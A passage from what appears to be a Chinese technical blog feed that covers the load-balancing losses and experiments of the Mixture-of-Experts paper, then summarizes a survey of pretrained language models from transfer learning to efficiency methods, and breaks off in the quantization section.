<h2 id="平衡专家利用率">平衡专家利用率</h2>
<p>根据论文观察结果，门控网络倾向于为特定的少数专家提供较大的权重。事实上，刚开始受到关注的某些专家会训练地更快，从而会更容易被选择，我愿称其为神经网络的马太效应。为了避免这种情况，论文使用了一种软间隔的方法。定义专家的重要性为 batch 数据中在该专家上的门控值之和。额外损失项<span class="math inline"> \(L_{importance}\)</span>，定义为重要性的变异系数的平方乘以缩放系数<span class="math inline"> \(w_{impotance}\)</span>。公式如下： <span class="math display">\[
Importance(X)=\sum_{x\in X}G(x)
\]</span></p>
<p><span class="math display">\[
L_{importance}(X)=w_{importance}\cdot CV(Importance(X))^2
\]</span> 变异系数（coefficient of
variation，CV），定义为标准差和平均值之比，是概率分布离散程度的归一化度量。当有多个变量进行离散程度比较时，标准差会受到量纲的影响，而变异系数可以消除这种影响。上述损失类似 L2 正则项，倾向于让专家有相同的重要性，但是，专家收到的样本数量可能不同，例如一位专家收到少而权重大的数据，另一个专家收到多而权重小的数据。这会导致分布式硬件出现内存、性能的问题。</p>
<p>为解决上述问题，论文还引入了一个损失<span class="math inline"> \(L_{load}\)</span>。公式如下： <span class="math display">\[
P(x,i)=\Phi(\frac{(x\cdot
W_g)_i-kth\_excluding(H(x),k,i)}{Softplus((x\cdot W_{noise})_i)})
\]</span></p>
<p><span class="math display">\[
Load(X)_i=\sum_{x\in X}P(x,i)
\]</span></p>
<p><span class="math display">\[
L_{load}(X)=w_{load}\cdot CV(Load(X))^2
\]</span></p>
<p>其中，<span class="math inline">\(P(x,i)\)</span> 定义为<span class="math inline"> \(G(x)_i\)</span> 不为 0 的概率，<span class="math inline">\(kth_excluding(H(x),k,i)\)</span> 为除了第<span class="math inline"> \(i\)</span> 个元素外，<span class="math inline">\(H(x)\)</span> 中最大的第<span class="math inline"> \(k\)</span> 个元素的值，<span class="math inline">\(\Phi\)</span> 为标准正态分布的概率分布函数。</p>
<p><span class="math inline">\(L_{load}\)</span> 粗看可能较难理解，将其转化为下式，其中<span class="math inline"> \((x\cdot
W_g)_{a_k}\)</span> 为第 k 大的门控值。可以看出，上式来自<span class="math inline"> \(H(x)\)</span> 的计算，<span class="math inline">\(H(x)\)</span> 中添加了高斯噪声平滑项，<span class="math inline">\(P(x,i)\)</span> 实际计算得到的是专家<span class="math inline"> \(i\)</span> 和被选中的权值最小的专家（第 k 个）门控值间的差异，并引入高斯噪声，通过标准正态的 CDF 映射得到选中第<span class="math inline"> \(i\)</span> 专家的概率。再通过变异系数计算损失，与<span class="math inline"> \(L_{importance}\)</span> 类似。 <span class="math display">\[
P(x,i)=\Phi(\frac{(x\cdot W_g)_i-(x\cdot W_g)_{a_k}}{Softplus((x\cdot
W_{noise})_i)}-\epsilon)
\]</span></p>
<h2 id="实验">实验</h2>
<h3 id="亿级语言模型">亿级语言模型</h3>
<ul>
<li>数据集：约 8.29 亿 token 的新闻语料，词表约 80w</li>
<li> 先前 SOTA：若干个堆叠的 LSTM 网络组成，参数从 200w 到 1.51 亿</li>
<li>本文模型：两层 LSTM 堆叠，中间有一个 MoE 层，MoE 层的大小、专家数量有所不同（4-4096）。每个专家约 100w 参数，选择的专家数 k=4</li>
</ul>
<p>为了研究增加容量的效果，论文训练了一系列 MoE 模型，并控制它们的计算成本（约时间步每 800w 次加乘操作，该指标记作 ops/timestap）。</p>
<p>下图展示了该任务上 LSTM 和 MoE 的比较结果。左侧图展示了同样计算成本下，模型的困惑度与参数的关系。基线 LSTM 模型只存在图左上方，少参数而高困惑度。展平的 MoE 与分层 MoE 能在同样参数规模下，获得更低的困惑度。右图为 40 亿参数下，困惑度与计算成本的关系。</p>
<p><img src="comparison.png"></p>
<p>下表展示了详细的对比结果，高计算成本的 MoE 能够显著降低困惑度。要注意的是，虽然 MoE 参数最多 30 倍于基础模型，但是每个样本只有 4 个专家处于激活态，这使得模型间的实际激活的参数、计算性能是可比的。</p>
<p><img src="table-comparison.png"></p>
<h3 id="千亿谷歌语料">千亿谷歌语料</h3>
<p>与上述实验配置、结果相似。不过随着 MoE 层中的参数数量超过 10
亿，增加额外容量似乎会产生递减收益，</p>
<p><img src="google.png"></p>
<h3 id="单语对机器翻译">单语对机器翻译</h3>
<p>WMT'14 翻译数据集，以英法翻译结果为例。此任务使用的模型是 GNMT
模型的修改版本。为了减少计算量，模型的编码器和解码器中的 LSTM 层数分别从
9 层和 8 层减少到 3 层和 2 层。论文在编码器（第 2 层和第 3
层之间）和解码器（第 1 层和第 2 层之间）中都插入了 MoE 层。每个 MoE
层包含多达 2048 位专家，每个专家大约有 200
万个参数，总共为模型添加了大约 80 亿个参数。</p>
<p><img src="en-fr-translation.png"></p>
<h3 id="多语对翻译">多语对翻译</h3>
<p>传统方法，使用同一模型进行多语翻译的性能，要差于训练多个模型分别处理单语对翻译。这是由于多个模型提供了更大的模型容量。论文用单一的 MoE 重复了这个实验。MoE
模型在开发集比多语言 GNMT 模型。在 BLEU 得分上，MoE 模型在 12
个语言对中的 11 个上显着击败了多语言 GNMT 模型（高达 5.84 分），甚至在
12 个语言对中的 8 个上击败了单语 GNMT 模型。</p>
<p><img src="multi-translation.png"></p>
<h2 id="总结">总结</h2>
<p>这篇论文提出了一种条件计算的方法，并解决了其在实践中遇到的种种挑战（负载均衡、分布式性能等）。在语言模型、机器翻译任务上，证实了其提升模型容量同时保证计算性能的能力。</p>
<h2 id="参考">参考</h2>
<ul>
<li><a href="https://zh.m.wikipedia.org/zh-sg/变异系数">变异系数 -
维基百科，自由的百科全书 (wikipedia.org)</a></li>
</ul>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>条件计算</category>
      </categories>
      <tags>
        <tag>条件计算</tag>
        <tag>门控</tag>
        <tag>MoE</tag>
      </tags>
  </entry>
  <entry>
    <title>预训练模型综述</title>
    <url>/blog/2022/01/22/PTM-Study/</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
<p>《Pre-Trained Models: Past, Present and
Future》是由来自清华、人大、复旦等高校的多位学者合作完成的预训练模型（Pre-Trained
Models,
PTM）综述。顾名思义，该文主要在讨论预训练模型的过去、现状和未来。
<span id="more"></span></p>
<p>深度神经网络（CNN、RNN 等）通过自动化学习特征，解决了传统机器学习面临的复杂特征工程问题。但是由于特征学习过程缺少人为干预，只通过数据学习，严重依赖于有监督数据的质量和数量。而高昂的人工标注费用使得这一问题更为严峻。</p>
<p>迁移学习的思想缓解了这一问题。借鉴于人类可以利用已学到的知识解决新的问题，迁移学习旨在通过预训练 - 微调两阶段的方法，在预训练阶段大规模数据上学习后，只需较少的样本即可在下游任务上微调并取得较好效果。这降低了模型训练和试错的开销。广泛应用于计算机视觉的各项任务：图像分类、目标检测等。</p>
<p>这一想法也被应用于自然语言处理领域。在 GPT 之前，这一思想代表为 Word2Vec、Glove 为代表的静态词向量。通过在连续词袋等任务上的预训练，模型能够学习到有意义的词向量（平移不变性），进而可以应用于各类任务中。然而，受限于静态词向量的表征能力，面临一词多义问题时，这些词向量往往不能表现出很好的效果。虽然也有一些工作试图将每个词的不同含义在空间中区分开，但并没有根本性地解决这个问题。</p>
<p>在 Transformer 提出后的次年，基于该架构的 GPT 和 BERT 预训练模型问世。它们证实了，当预训练模型的规模变得更大，具有数亿个参数时，预训练模型可以捕获多义消歧、词汇和句法结构，在下游任务上表现出出色的性能，取得甚至比人类更优的结果。随着更大算力的投入，近些年来，预训练模型的规模呈几何翻倍式增长。GPT-3 具有数千亿参数，表现出了类似人类的少样本学习能力，如下图所示。</p>
<p><img src="gpt3-fsl.png"></p>
<p>但是，预训练模型的理论尚不成熟，大规模参数的本质难以理解，巨大的计算成本也让人望而却步。预训练模型已经将研究人员推在一个选择的十字路口中，本文就是在这样的背景下，总结预训练模型取得的成果，并讨论其发展和未来。</p>
<h2 id="背景">背景</h2>
<h3 id="迁移学习">迁移学习</h3>
<p>迁移学习的概念可以追溯到 1998 年，迁移学习旨在从多个源任务中获取重要的<strong>知识</strong>，然后将这些知识应用于目标任务。源任务和目标任务的数据格式、任务目标可能不同，但解决任务所需的知识是一致的。因此，NLP 里出现很多不同的预训练方法，本质上是希望能从多个维度去学习无监督语料中的知识。当预训练任务和下游任务关系密切时，模型更有可能取得好效果。</p>
<p>迁移学习包含两种方法：特征迁移和参数迁移。特征迁移方法预训练有效的特征表示以预编码跨领域和任务的知识。通过将这些预训练的表示注入目标任务，可以显着提高目标任务的模型性能。典型的代表就是 NLP 中的静态词向量 Word2Vec。参数迁移方法遵循一个直观的假设，即源任务和目标任务可以共享模型参数或超参数的先验分布。因此，这些方法将知识预编码为共享模型参数。然后将知识通过精细转换使用目标任务的数据调整预训练参数。参数迁移常见于 CNN。ELMO 和 BERT 分别是特征迁移和参数迁移的两种代表。</p>
<p>在迁移学习思想指导下、高质量数据集 ImageNet 的驱动下（覆盖数千个类别的百万张图片）、正则化方法（残差连接）的加持下，在 CV 领域诞生了 ResNet 这样的预训练模型，可用于图像分类、目标检测、图像分割等多项任务。NLP 领域也进行了尝试，典型代表是 CoVE，在 LSTM 上预训练机器翻译任务后，其编码器可以用于下游任务。</p>
<h3 id="自监督学习">自监督学习</h3>
<p>监督学习、无监督学习、子监督学习的关系如下图所示。</p>
<p><img src="methods.png"></p>
<p>自监督学习利用输入数据本身作为监督，从大规模未标记数据中提取知识，这与无监督学习类似。区别在于无监督学习主要侧重于检测数据模式，通过聚类、异常检测等方法，而自监督学习是通过无监督数据构造出了有监督的数据，使用有监督的方法进行训练。近些年来，NLP 里的预训练任务都是自监督学习。在 BERT 的启发下，研究者们设计出了各类的预训练任务。预训练模型成功的关键就是自监督学习和
Transformer。</p>
<h2 id="transformer">Transformer</h2>
<p>在 Transformer 之前，RNN 一直是处理序列任务的标准方法。RNN 顺序读取 token 并更新状态，这使得它可以处理任意长度的序列，但也限制了它的并行能力。Transformer 结构如下图所示。</p>
<p><img src="transformer-gpt-bert.png"></p>
<p>Transformer 是一种基于 Seq2Seq 的架构，由编码器和解码器组成。编码器和解码器都由几个相同的模块堆叠而成。每个模块都包含多头注意力机制、残差连接和层标准化。详细的介绍可以看我的这篇博客 <a href="https://tqnwhz.github.io/blog/2021/08/14/Transformer/">Transformer
| 一隅</a>
。正则化方法使得训练更深的网络成为可能。Transformer 使用的 Attention 包含以下三种：</p>
<ul>
<li>自注意力。用于编码阶段的多头注意力机制，将输入序列中的每个单词和其他单词计算注意力分数，进而得到该单词的向量表征。这也是 Word2Vec 的思想。</li>
<li>掩码自注意力。用于解码阶段生成阶段。Transformer 解码器还是按照自回归的方式进行解码，因此计算注意力的时候需要注意不能泄露数据，只能计算每个单词左侧的注意力，右侧掩码。</li>
<li>交叉注意力。用于解码阶段。Query 为前一个解码器模块的输出，Key 和 Value 为编码网络的输出。类似 Seq2Seq 中的注意力。</li>
</ul>
<p>由于强大的特征抽取能力，Transformer 逐渐成为 NLP 中的标准。GPT、BERT 等 PTM 由此诞生。</p>
<h3 id="gptbert">GPT&amp;BERT</h3>
<p>GPT 使用 Transformer 的解码器来训练语言模型。BERT 使用 Transformer 的编码器训练掩码语言模型，二者的区别如下图所示。GPT 只有掩码自注意力机制，使用自回归的方法建模语言模型，通过极大似然的方法训练，主要用于自然语言生成（NLG）任务。BERT 中只有自注意力机制，使用双向的注意力机制建模掩码语言模型和下句预测任务，主要用于自然语言理解任务（NLU）。掩码语言模型参考了 “完形填空” 的思路，即从句子中随机挡住一个符号（标记为 [MASK]），由模型来根据其他部分预测这个符号，即可认为是这个单词的表示。</p>
<p><img src="gpt-bert.png"></p>
<h3 id="gptbert之后">GPT&amp;BERT 之后</h3>
<p>在 GPT 和 BERT 之后，研究者们提出了一些改进工作，例如 RoBERTa 和 ALBERT。</p>
<p>RoBERTa 是 BERT 的成功变体之一，主要有四个简单有效的变化：（1）去除
NSP 任务； (2) 更多的训练步骤，更大的 batch size 和更多的数据； (3)
更长的训练期限；
(4) 动态改变 [MASK] 模式。这些改进使得 RoBERTa 在一些任务上取得优于 BERT 的效果。</p>
<p>ALBERT 是 BERT
的另一个重要变体，它致力于减少 BERT 的参数。首先，它将输入的词嵌入矩阵分解为两个较小的矩阵。其次，它强制所有 Transformer 层之间的参数共享以显着减少参数。第三，它提出了句子顺序预测（SOP）任务来替代
BERT 的 NSP 任务。作为对其空间效率的牺牲，ALBERT
的微调和推理速度较慢。如图 9 所示，除了 RoBERTa 和
ALBERT，近年来还提出了各种
PTM，以更好地从未标记的数据中捕获知识。一些工作改进了模型架构并探索了新的预训练任务，例如
XLNet、UniLM，MASS 等。此外，整合丰富的数据源也是一个重要的方向，例如利用多语言语料库、知识图谱和图像。还有一些工作致力于则增大模型规模，例如 GPT-3。</p>
<p>参考下面这张预训练模型全家福。</p>
<p><img src="ptm-family.png"></p>
<h2 id="架构设计">架构设计</h2>
<p>通常，所有用于语言预训练的 BERT 之后的 Transformer
架构都可以根据两个动机进行分类：统一序列建模和认知启发式架构。</p>
<h3 id="统一序列建模">统一序列建模</h3>
<p>NLP 具有挑战性的原因之一，就是因为它有很多下游任务，通常可以分为三类：</p>
<ul>
<li>自然语言理解（NLU）：单词 / 段落 / 句子分类、语法 / 句法分析、知识推理等</li>
<li>开放域自然语言生成：对话生成、文本生成、故事生成等</li>
<li>非开放域自然语言生成：机器翻译、摘要等</li>
</ul>
<p>这些任务虽然多样，但所需的能力却是通用的，无外乎语言理解和语言生成能力。正如费曼所说，我不能创造的，我也不理解（What
I cannot create, I do not
understand）。语言理解任务可以转化为生成任务。因此 GPT 此类生成模型也可用于理解任务，甚至一些研究表明，与
BERT 相比，GPT 在理解基准方面可以达到相似甚至更好的性能（Liu
等人，2021b）。因此研究者们开始寻求一种统一的方式，建模所有的任务。</p>
<h4 id="结合自回归和自编码">结合自回归和自编码</h4>
<p>XLNet 首先将 GPT 式的单向生成和 BERT
式的双向理解统一起来，结合自回归和自编码的思想
，提出了置换语言模型的预训练任务。XLNet 通过在预训练中排列 token 的顺序，然后应用自回归预测范式来解决这个问题，这赋予了 XLNet 理解和生成的能力。UniLM 提出联合训练不同的语言建模目标，包括单向、双向和
seq2seq 目标。这可以通过更改 Transformers 中的注意力掩码来实现。 UniLM
在生成式问答和抽象摘要方面表现出色。</p>
<p>最近，GLM (Du et al., 2021)
提出了一种更优雅的方法来结合自回归和自编码。给定一个可变长度的掩码跨度，而不是像
BERT
一样，一个 token 对应一个 [MASK] 标记。GLM 会自回归地生成 [MASK] 对应的 token。GLM
是第一个在包括自然语言理解、条件生成和无条件生成在内的所有类型任务上同时实现最佳性能的模型。</p>
<h4 id="应用广义的编码-解码器">应用广义的编码 - 解码器</h4>
<p>在 GLM 之前，无论是编码器架构的模型（例如 BERT）还是解码器架构的模型（例如 GPT），都无法解决在句子的多个空白处添加任意个符号的问题。BERT 只能将 MASK 替换为一个单词，而 GPT 只能在句子末尾添加任意个单词。因此，很自然的想法是转向类似机器翻译 Transformer 的 encoder-decoder 架构。</p>
<p>这一类型的先驱是 MASS（Song et al.,
2019），它将掩码预测策略引入到编码器 - 解码器结构中。然而，MASS
并没有涉及填充可变长度空白的问题。 T5 (Raffel et al., 2020)
通过仅用一个掩码标记掩码文本中可变长度的跨度来解决该问题，并要求解码器恢复整个掩码序列。BART
(Lewis et al., 2020a)
引入了一个有趣的想法，即通过截断、删除、替换、改组和掩码等多种操作来破坏源序列，而不仅仅是掩码。然而，encoder-decoder 架构的预训练模型存在以下问题：</p>
<ol type="1">
<li>参数更多、参数效率低下</li>
<li>在 NLU 方面表现不佳</li>
</ol>
<h3 id="认知启发式架构">认知启发式架构</h3>
<p>虽然 Transformer 很强大，但与人类的认知系统还是有较大差距。注意力机制借鉴自人类的感知功能，然而人类还具有决策、逻辑推断、工作记忆等功能。</p>
<h4 id="可维护的工作记忆">可维护的工作记忆</h4>
<p>Transformer 的一个问题在于固定的序列长度和<span class="math inline"> \(O(n^2)\)</span> 的复杂度，即每个 token 都要与其他 token 计算注意力。这严重阻碍了它在长文档理解中的生成和应用。然而，人类也不具备很好的长程注意力机制。认知科学家们发现人类可以保持一种工作记忆，这种记忆不仅可以组织和记忆，还可以忘却。传统的 LSTM 正是这种思想的实践。</p>
<p>基于 Transformer 的架构中，Transformer-XL 是第一个引入段级递归和相对位置编码来实现这一目标的。它将源序列分割为若干个段，上一个段的状态会被缓存下来，在当前片段计算注意力时使用（但不更新梯度），然后缓存新的状态，重复此过程，也就是段级递归名称的来源。这个过程隐含着工作记忆的思想。CogQA 提出在多跳阅读中保持认知图。它通过 PTM（BERT）和 GNN 两个系统建模认知图。先通过 BERT 提取相关实体，再通过 GNN 构造认知图谱，进行推理和计算。CogQA 的一个局限是 PTM 仍使用了固定的窗口大小。CogLTX 将长文本切分为若干个 block，利用记忆回想模块给 block 打分，选择相关性更高的 block 进行使用。</p>
<h4 id="可持续的长期记忆">可持续的长期记忆</h4>
<p>GPT-3 的成功揭示了 Transformer 具有记忆功能。在此之前， Lample et al.
(2019) 等人发现，将 Transformer 的前馈神经网络替换为大型键值记忆网络，仍可以工作的很好。这在某种程度上表明 Transformer 中的前馈神经网络等价于记忆网络。然而，其记忆内存容量非常有限。REALM
(Guu et
al.,2020) 探索了如何为 Transformer 构建外部存储的先驱。它通过将整个维基百科的文本向量化，使用掩码语言模型预训练知识检索器。在开放域问答上取得了 SOTA 效果。</p>
<p>除了张量文本语料库外，(Vergaet al., 2020; Févry et al., 2020)
提出将知识库中的实体和关系向量化，并将上下文中 token
embedding 替换为对应的 entity embedding。(Dhingra et al., 2020; Sun et
al.,
2021) 从零开始维护一个虚拟知识，并提出了一个可微分的训练目标。所有这些方法在很多开放域问答基准上取得了一些改进。</p>
<h4 id="其他变种">其他变种</h4>
<p>此外，还有一些工作致力于修改 BERT 的结构 / 预训练目标，达到更好的 NLU 能力。Span-BERT 证实了使用跨边界目标
(SBO) 掩盖连续随机长度的 token 可以提高 BERT
的性能。ELECTRA 将掩码语言模型替换为替换符号检测任务，生成器会替换原始序列中的 token，而判别器检测 token 是否被替换。</p>
<h2 id="使用多源数据">使用多源数据</h2>
<p>一些预训练模型使用多源异构数据，例如多模态、多语言的 PTM、知识增强的 PTM。</p>
<h3 id="多语言预训练">多语言预训练</h3>
<p>在单语言语料库（如英语）上预训练的模型在许多基准测试中取得了巨大成功。但是我们生活的世界是多语言的，为每种语言都训练和维护一个单独的模型并不是一个合理的方案，尤其是涉及到机器翻译的场景。事实上，虽然人们使用的语言不尽相同，但是他们可以表达相同的意思。这表明语义是独立于语言的。一些研究人员发现，使用多语言训练模型，效果要优于几种单语言模型。因此，相较于训练很多个单语言模型，训练多语言模型可能是个更好的方法。</p>
<p>在 BERT 之前，已经有研究者探索多语言表征，主要有两种方法。第一种是参数共享，例如使用多种语言对训练多语言 LSTM，实现多语言翻译。另一种是学习与语言无关的约束，例如使用 WGAN 框架将语言表示解耦为与语言无关的表示。这两种方式都能应用于多语言场景，但仅限特定的任务。换而言之，上述两种方法都是用同一个特定的任务训练的，不能推广到其他任务。</p>
<p>BERT 的出现表明，使用自监督的方法进行预训练，对特定任务进行微调的方法是可行的。这促使研究人员设计任务预训练通用的多语言模型。多语言任务同样可以分为 NLU 和 NLG 两类。</p>
<p>一些 NLU 任务首先在非并行多语言语料上训练多语言的 PTM。例如，Devlin
等人提出的多语言的 BERT（mBERT），使用维基百科上 104 种语言的非并行语料库建模多语言掩码语言模型（MMLM）任务。（吐槽，维基百科不同语言的内容还是有较大差别的）。研究表明，mBERT 具有在零样本场景中泛化跨语言知识的能力。这表明即使使用相同的
BERT
结构，使用多语言数据也可以使模型学习跨语言表示。XLM-R 构建了一个名为 CC-100 的非并行多语言数据集，规模远大于 mBERT 使用的维基百科语料，尤其是对于那些语料相对匮乏的语言。XLM-R 在 CC-100 上进行预训练，在多项基准测试中获得优于 mBERT 的性能，这表明更大规模的多语言语料库可以带来更好的性能。</p>
<p>然而，多语言掩码语言模型无法很好的利用并行语料。而并行语料对于一些 NLP 任务，例如机器翻译来说是至关重要的。并且直觉来说，并行语料能够让模型更快更好地学习到意义相同的跨语言表征。从这一点出发，XLM 使用双语句子执行翻译语言模型（TLM）的任务。具体做法是将双语语料拼接成一个句子，在两个部分中分别随机掩码。与 MLM 相比，TLM 需要模型从不同语料中获取和对齐语义信息，并进行预测。</p>
<p>除了 TLM，还有一些其他的方法从并行语料中学习跨语言表征。Unicoder
提供了两个基于平行语料的新预训练任务：跨语言单词恢复（CLWR）和跨语言释义分类（CLPC）。CLWR 使用目标语言 embedding 和注意力机制恢复源语言 embedding，类似机器翻译。CLPC 将对齐的语料拼接作为正样本，未对齐的作为负样本，进行句子级别的分类。ALM
(Yang et al., 2020) 自动从并行句子生成代码转换序列并对其执行
MLM，这迫使模型仅基于其他语言的上下文进行预测。InfoXLM (Chi et al.,
2020b) 从信息论的角度分析了 MMLM 和
TLM，鼓励模型在对比学习的框架下区分对齐的句子对和未对齐的负例。HICTL
(Wei et al., 2021)
扩展了使用对比学习来学习句子级和单词级跨语言表示的想法。 ERNIE-M (Ouyang
et al., 2020)
提出了反向翻译掩码语言建模（BTMLM），并通过反向翻译机制扩大了并行语料库的规模。反向翻译是一种数据增强的方法，例如将语言 X 翻译为语言 Y 的任务，可以将语言 Y 翻译回语言 X‘，然后比较 X 与 X’是否相同，若不同的话可以将 X' 也加入数据集。
这些工作表明，利用平行语料库可以为学习跨语言表示带来很大帮助。</p>
<h3 id="多模态预训练">多模态预训练</h3>
<p>人类所面临的世界是多模态的，包含视觉、听觉、语言等多种模态。模态指的是事情是如何发生和经历的。近年来，研究者们对多模态研究热情高涨，这些跨模态的工作大部分都归类于视觉和语言（V&amp;L）的交叉，例如视频和文本、图像和文本的交叉。V&amp;L 预训练的工作主要集中在改进模型架构、利用更多数据以及设计更好的预训练任务上。</p>
<p>对于基于图像文本的 PTM，目前大多数工作都是基于视觉语言 BERT
的架构。主要挑战在于统一语义空间中视觉和文本内容的对齐（即 V&amp;L
基础）。为此，主要有两种模型架构设计：双流和单流。双流模型，例如 ViLBERT，使用两个独立的流处理图像和文本，并将它们通过 Transformer 注意力模块融合。单流模型，例如 Visu-alBERT，图像区域特征和词嵌入通常被拼接送入单个 Transformer 中。考虑到简单性和效率，目前工作主要使用单流模型。</p>
<p>在预训练任务的选择上，V&amp;L 的理解任务广泛使用 MLM、句子 - 图像对齐（SIA）、遮挡区域分类（MRC），遮挡区域特征回归（MRFR）和直接合并下游任务。其中，MLM
旨在借助视觉和文本上下文恢复字幕中的掩码标记。 SIA
旨在判断图像 - 文本对是否匹配。
MRC 可以被认为是视觉 MLM，需要 V&amp;L 模型来预测被掩蔽对象的类别。MRFR 进一步需要 V&amp;L 模型来恢复被掩蔽对象区域的视觉特征。
也有模型在预训练阶段直接进行下游 V&amp;L 理解任务。</p>
<p>上述提到的预训练任务专用于 V&amp;L 理解或者字幕生成，不能用于图像生成任务。最近提出的 DALLE 是第一个基于 Transformer 的文本到图像的 PTM，可用于条件图像生成，它显示了多模态 PTM 在联系文本描述和图像生成之间的潜力，尤其是组合不同对象的出色能力。</p>
<p>除了图像 - 文本 PTM，还有其他形式的 PTM，例如视频和音频。 VideoBERT
(Sun et al., 2019a) 对 Cooking312K 视频数据集 (Sun et al.,2019a)
进行预训练，并在零镜头动作分类任务和视频字幕任务上验证模型。SpeechBERT
(Chuang et al.,
2019）首先将连续音频信号编码成几个语音语义词嵌入，然后使用 MLMon
文本和音频模态作为预训练任务。
预训练后，使用口语问答（SQA）任务进行评估。</p>
<h3 id="知识增强预训练">知识增强预训练</h3>
<p>PTM 可以从大量数据中获取统计信息，而外部知识是统计建模的优秀先验。外部知识可以分为结构化知识（如知识图谱）和非结构化知识（维基百科文本）。一些工作试图通过整合实体和关系嵌入来增强 PTM，或者是它们与文本的对齐方式。Wang 等人（2021b）基于维基数据实体的描述预训练模型，通过将语言模型损失和知识嵌入损失结合在一起以获得知识增强表示。</p>
<h2 id="提高计算效率">提高计算效率</h2>
<p>PTM 的趋势是模型越来越大，因此提升计算效率以满足日益增加的内存与计算需求非常关键，可以分为以下三种方法。</p>
<h3 id="系统级优化">系统级优化</h3>
<p>通常与具体模型无关，可以分为单设备优化和多设备优化。</p>
<p><strong>单设备优化</strong>，一个典型的例子是浮点数精度优化。现代深度学习系统主要基于单精度浮点数（FP32），然而权重往往落在一个有限的区间里，
可以考虑使用半精度格式（FP16）完成大部分计算，而几乎没有精度损失。但是在某些情况下，也可能会出现浮点截断和溢出，为解决这个问题，研究者们提出了混合精度训练，它在
FP32
中保留一些临界权重以避免浮点溢出，并使用动态损失缩放操作来摆脱浮点截断。充分的实验表明，混合精度训练方法比
FP16
中直接训练模型更稳定。尽管混合精度训练方法可以显着减少训练时间和内存使用量，但它们仍然面临一些挑战。当模型参数没有很好地初始化时，混合精度方法仍然可能导致训练不稳定。这些挑战仍有待进一步探索。此外，还可以通过舍弃 Transformer 中的部分隐藏状态、利用 CPU 存储模型参数再通过精细的策略完成 CPU 和 GPU 内存交换，来降低模型内存开销。</p>
<p><strong>多设备优化</strong>。预训练模型往往使用分布式的方法进行训练，使用多个节点中的多个 GPU 来加速计算，并行方法可以分为数据并行、模型并行。</p>
<p><strong>数据并行</strong>是一种简单有效的加速模型的方法，如下图所示。使用数据并行时，大 Batch 数据被划分到不同的节点，可以并行化前向传播。
在反向传播时，不同节点上的梯度应该通过 all-reduce
操作进行聚合，以保证参数优化的一致性，这可能会引入额外的通信开销。容易看出，这相当于每个 GPU 上都保存了一份模型参数。</p>
<p>当单个模型的参数达到十亿或更多时，模型参数无法容纳在同一个 GPU 上（即使是半精度或者混合精度训练），这使得数据并行无法进行。<strong>模型并行</strong>则可以解决这个问题，通过将矩阵运算分块，分布在不同的 GPU 上，再通过节点间的通信操作保证前向 / 反向传播的正确性。但是，模型并行需要在前向 / 反向传播过程中插入通信操作，无法与计算重叠。对比之下数据并行的 all-reduce 操作通常可以被反向计算重叠。因此，数据并行是首选，只要它可以克服内存容量的过度需求。</p>
<p>下面这张图和模型并行和数据并行的示例。</p>
<p><img src="data-parallel.png"></p>
<p>模型并行还存在另一种流水线并行的方法。将模型划分为很多层，不同层分布在不同的节点，前一层的输出作为后一层的输入。流水线并行只需要在执行管道相邻阶段的节点之间传递中间激活状态，通信成本较小。但是，流水线并行以一个 batch 的前向和反向传播为完整周期，会有流水线气泡产生。</p>
<h3 id="高效预训练">高效预训练</h3>
<p>除了一些系统级的优化方法外，研究人员还致力于探索更有效的预训练方法，以便能够以较低成本的解决方案对大规模
PTM 进行预训练。</p>
<p><strong>高效的训练方法。</strong>传统的预训练任务可能样本效率低下。以 MLM 为例，需要模型根据上下文来预测掩码标记。掩码标记通常是输入标记的子集（通常为
15%），即模型只能从一小组输入标记中学习。为了解决这个问题，ELECTRA
(Clarket al., 2020)
提出了替换令牌检测任务。此任务强制模型区分输入标记是否被生成器替换。此任务可以利用来自每个样本的更多监督信息，因为需要区分所有输入标记。实验证明，ELECTRA
仅需少得多的预训练步骤，就可以达到与 MLM 相似的性能。另外，传统 MLM 随机掩盖文档中的标记以进行预测。由于预测不同标记的难度差异很大，随机掩码策略使训练过程变得漫无目的且效率低下。一些工作根据 token 的重要性或者梯度，加速模型训练。</p>
<p>除了预训练任务外，当前的预训练动态也是次优的。最近的大规模 PTM 都要求大的 batch
size，因为研究指出这有利于模型收敛。但在一项早期工作中（Goyal 等人，2017
年），研究人员发现简单地增加 batch
size 可能会导致<strong>优化困难</strong>。因此，他们提出了一种预热策略（即 warm
up），在训练开始时线性增加学习率。这种策略通常用于最近的大规模
PTM。此外，研究者发现在 Transformer 不同层间自适应地使用不同的学习率也可以在 batch
size 较大时加快收敛速度。</p>
<p><strong>高效的模型架构。</strong>除了高效的预训练方法，更多的模型架构变体也可以降低计算复杂度，提高训练效率。正如之前提到的，基于 Transformer 的 PTM 面临长输入序列时会存在<span class="math inline"> \(O(n^2)\)</span> 序列长度复杂度的问题。一些工作致力于降低 Transformer 的复杂度。</p>
<h3 id="模型压缩">模型压缩</h3>
<p>另一个提高 PTM
效率的重要方法是模型压缩。通过将大型模型压缩为小型模型，以满足资源受限设备上更快推理和部署的需求。</p>
<p><strong>参数共享。</strong>PTM
可以通过在相似单元之间共享参数进行压缩。AL-BERT (Lan et al., 2019)
使用分解嵌入参数和跨层参数共享来减少 PTM 的参数，在所有 Transformer
层上使用相同的权重。ALBERT 在 BERT
模型的基础上实现了显着的参数减少，同时具有相同甚至更好的性能。这表明 PTM
可能极度过度参数化。</p>
<p><strong>模型剪枝。</strong>为了更好地利用当前 PTM
的过度参数化特性，另一种减少模型参数的方法是模型剪枝，它在 PTM
中剪掉一些无用的部分，以在保持性能的同时实现加速。研究人员研究了
Transformers
中注意力头的冗余，发现只有一小部分就足以获得良好的性能。这些头中的大部分都可以移除，而对准确性的影响很小。</p>
<p><strong>知识蒸馏。</strong>虽然 ALBERT 减少了 PTM 的大小，但并没有减少推理时间，因为模型计算复杂度并没有减小。知识蒸馏旨在训练一个小模型以复现大模型的行为。有一些典型的工作将知识蒸馏用于
PTM，例如 DistillBERT (Sanhet al., 2019)、TinyBERT (Jiao et al.,
2019)、BERT-PKD (Sun et al., 2019b) 和 MiniLM (Wang et al., .,2020d)。
但是，知识蒸馏方法需要用于预训练教师模型的数据，考虑到数据版权和隐私，这些数据通常不会发布。而且，教师模型需要对整个预训练数据进行转发，以产生对数或中间表示进行知识蒸馏，导致训练时间更长。</p>
<p><strong>模型量化。</strong>模型量化是指将高精度浮点参数压缩为低精度浮点参数。
模型量化这个词听上去不是很好理解，更像是一种参数压缩方法。 传统的 PTM
通常用 32 位或 16 位浮点数表示参数，而量化后的模型可以用 8 位甚至 1 或 2
位表示。一种量化方法可以使用 k-means 对参数进行聚类，让相近的值落在同一个聚类中心，进而复用同一个值。对于最近的基于
